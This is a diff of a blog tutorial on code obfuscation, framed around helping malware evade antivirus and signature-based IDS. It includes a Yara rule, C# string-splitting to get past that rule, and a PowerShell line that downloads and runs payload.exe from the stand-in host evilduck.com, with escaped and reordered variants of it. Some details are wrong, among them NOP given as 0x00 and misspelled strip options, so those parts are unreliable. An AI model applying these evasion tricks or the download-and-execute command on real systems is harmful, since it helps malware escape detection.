@@ -36,9 +36,14 @@ var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXo
 parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
 {% endhighlight %}
 
-This behemoth of a script does exactly the same thing, and is near impossible for a human to understand.
+This behemoth of a script does exactly the same thing, and is near impossible for a human to understand. If you want to see some more interesting examples, [This StackExchange thread](https://codegolf.stackexchange.com/questions/22533/weirdest-obfuscated-hello-world) has many examples of obfuscating the string ```hello world```.
 
-### Methods of Code Obfuscation
+
+Some of the biggest obstacles to malware developers are antivirus engines and EDR (endpoint detection and response) systems. These detect malware based on a database of stored signatures. Antivirus and EDR systems deserve an entire article of their own, but two methods they use to detect malware are static signatures and heuristic signatures.
+* __Static signatures__ compare suspected malware code to a database of known malware samples, and flags up any matches.
+* __Heuristic signatures__ can detect malware code by searching for suspicious features
+
+Obfuscation helps to evade signature-based detection by ensuring any developed malware does not match any known signatures.
 
 Some common methods of code obfuscation include:
 * __Renaming__ - changing the names of variables and classes to meaningless identifiers, sometimes including unprintable or invisible characters
@@ -63,8 +68,120 @@ There are many other methods of code obfuscation out there, the above are a few 
 * Code-Element Layer
     * This layer aims to obfuscate code itself, as discussed above.
 * Software-Component Layer
-    * This layer aims to obfuscate entire software packages or execuribles, like a Java library or ELF formats (executable file format - executable files often used on Linux systems)
+    * This layer aims to obfuscate entire software packages or executables, like a Java library or ELF files (executable file format - executable files often used on Linux systems)
 * Inter-Component Layer
     * This layer aims to obfuscate interfaces between different software packages, for example library calls and resource encryption
 * Application Layer
-    * This layer is more specific to the application at hand, for example obscating neural networks, or DRM (digital rights management) systems. DRM systems are often used to prevent pirates from gaining cracked versions of movies and video games.
+    * This layer is more specific to the application at hand, for example obfuscating neural networks, or DRM (digital rights management) systems. DRM systems are often used to prevent pirates from gaining cracked versions of movies and video games.
+
+For the rest of this article, I will be focusing on the code-element layer. Perhaps the other layers will appear in a future post.
+
+The code-element layer can be further split into four sublayers, each with their own obfuscation methods.
+
+![alt text](\assets\img\cybersecurity\code_obfuscation\code_layers.PNG)
+
+One of the most useful groups of obfuscation methods is the ‘obfuscating data’ layer. This group of methods aims to hide important identifiable data, and focus on hiding common data types, such as integers, strings and arrays.
+
+The paper has given four main methods for obfuscating data:
+
+__Array transformation__ - methods include splitting one array into multiple arrays, and merging multiple arrays together, flattening arrays to reduce their dimension, and folding arrays to increase their dimension
+
+__Data encoding__ - use mathematical encoding algorithms or ciphers to make the data unreadable
+
+__Data proceduralization__ - replacing static data with function calls, for example replacing all strings with a function that can generate all strings based on its parameters. Another method is replacing numbers with the values of invertible function.
+>For example, if we have the strings ‘apple’, ‘bandana’ and ‘ducks’ in our code, define a function f with return values f(0) = ‘apple’, f(1) = ‘bandana’ and f(2) = ‘ducks’.
+
+__Data splitting/merging__ - much like splitting and merging arrays, this method transforms other data types. For example, a boolean variable can be distributed into multiple booleans with the same logical output
+
+### String Concatenation
+
+One simple programming concept that can be exploited is string concatenation. Most programming languages allow you to concatenate, or join, two or more strings together. For example, the below code snippet shows string concatenation in Python, which uses the ```+``` operator to denote concatenation.
+
+{% highlight python %}
+s1 = 'rubber'
+s2 = 'ducky'
+print(s1+s2)
+>> 'rubberducky'
+{% endhighlight %}
+
+Wikipedia has a [list of string concatenation operators](https://en.wikipedia.org/wiki/Comparison_of_programming_languages_(strings)) for various programming languages. Python, C#, C++, Java and PowerShell all support the ```+``` operator. PowerShell also supports ```,``` and ```$```, C# also supports ```String.Join``` and ```String.Concat```, and C supports the operator ```strcat```.
+
+Static signatures can be evaded by exploiting concatenation. An attacker can break up strings included in code to evade any signatures looking for them, and concatenate the string back together during runtime.
+
+For example, consider the following Yara rule. Yara is an intrusion and detection system, or IDS, that includes the use of signatures to trigger alerts for suspicious activity.
+
+{% highlight xml %}
+rule rubberduckyrule {
+   strings:
+      $text_string = ‘powershell.exe’
+	  $hex_string = { 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 }
+
+   condition:
+      $text_string or $hex_string
+}
+{% endhighlight %}
+
+This Yara rule will look for any instances of ```powershell.exe``` (or the hex equivalent) in malware code, and raise an alert on any positive instances. Using string concatenation, we can evade this Yara rule! Suppose we have the following line of C# code in our malware:
+
+{% highlight c# %}
+System.Diagnostics.Process.Start("powershell.exe")
+{% endhighlight %}
+
+The ```powershell.exe``` string can be obfuscated into the following line:
+
+{% highlight c# %}
+System.Diagnostics.Process.Start("po"+"w"+"ers"+"he"+"l"+".e"+"xe")
+{% endhighlight %}
+
+The first line would trigger a Yara alert, but the second line would evade it completely! If we couple this methods some of the previously mentioned methods for data obfuscation, such as data proceduralization, this code would be incredibly difficult to detect by static signature-based IDSs.
+
+### More String Obfuscation
+
+We can take the string concatenation method further by introducing non-interpreted characters. PowerShell scripts are particularly vulnerable to this method.
+
+For example, we can introduce escaping characters, such as ``` ` ``` to strings. This will break the string up and evade any static signature-based detection systems. For example, consider the powershell command
+
+{% highlight powershell %}
+(New-Object System.Net.WebClient ).DownloadFile('http://evilduck.com/payload.exe') ; Start-Process("$env:APPDATA\payload.exe)
+{% endhighlight %}
+
+This Powershell script will connect to ```http://evilduck.com```, download the file ```payload.exe```, and execute it. If an IDS has a signature for ```evilduck.com``` or ```payload.exe```, it’s game over for the malware developer.
+
+Using escape characters, the url in the script can be obfuscated to become
+
+```
+h`ttp://evi`ld`uc`k`.co`m/p`ayl`oa`d
+```
+
+Powershell will ignore the ``` ` ``` characters when executing, so the original payload executable will still be downloaded and executed. However, this is now much harder for a signature-based IDS to detect the script.
+
+Another method in Powershell obfuscation is reordering, with the format operator ```-f```. For example, the string ```payload.exe``` can be obfuscated to
+
+```
+{1}{0} -f ‘oad.exe’, ‘payl’
+```
+
+Other methods include randomly adding upper and lowercase letters to strings, and inserting random whitespaces between words. A combination these, concatenation, escape characters, reordering and other non-interpreted characters, and other string-based obfuscation methods can make life for static signature-based IDSs pretty difficult.
+
+As great as these methods are at evading IDSs, a skilled human would still be able to understand data obfuscated by code (probably after a lot of caffeine). For this reason, we turn to some more methods of code obfuscation.
+
+Going back to the taxonomy outlined above, we now look at some more sublayers of the code-element layer.
+
+### Code Layout Obfuscation
+
+![alt text](\assets\img\cybersecurity\code_obfuscation\layout_layers.PNG)
+
+
+The ‘obfuscating layout’ sublayer attempts to completely mess up the layout of a program. The following methods can be used:
+
+ __Meaningless identifiers__ - completely disregard any logical naming conventions you use, and scramble them all up.
+>In C and C++, the names of global variables and functions are still stored in compiled binaries, and Java bytecode still keeps names. This method is also known as lexical obfuscation.
+
+__Stripping redundant symbols__ - many compiled programs contain metadata not used in runtime, but used to debug code. This can be removed to make reverse engineering a truly cumbersome process.
+>For example, compiled ELF files have symbol tables stored in the .symbtab section, containing identifier-address pairs. This symbol table is only used to debug programs, so can be removed with the command ```strip --strip-uneeded [target.elf]```
+
+__Separating related codes__ - this method aims to shuffle parts of a program that are logically related.
+>For example, using numerous unconditional jumps in assembly code using the goto command (or equivalent)
+
+__Junk Code__ - add instructions and methods which have no functionality.
+>For example, in binaries no-operation instructions (```NOP``` or ```0x00```) can be inserted. This will make code hard to read, and change the signature of the program.
